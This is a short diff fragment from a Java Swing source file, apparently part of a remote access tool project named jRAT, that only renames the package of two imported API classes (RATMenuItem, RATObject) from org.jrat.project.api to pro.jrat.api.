@@ -42,8 +42,8 @@ import javax.swing.event.PopupMenuEvent;
 import javax.swing.event.PopupMenuListener;
 import javax.swing.table.DefaultTableModel;
 
-import org.jrat.project.api.RATMenuItem;
-import org.jrat.project.api.RATObject;
+import pro.jrat.api.RATMenuItem;
+import pro.jrat.api.RATObject;
 
 import com.redpois0n.Constants;
 import com.redpois0n.Help;
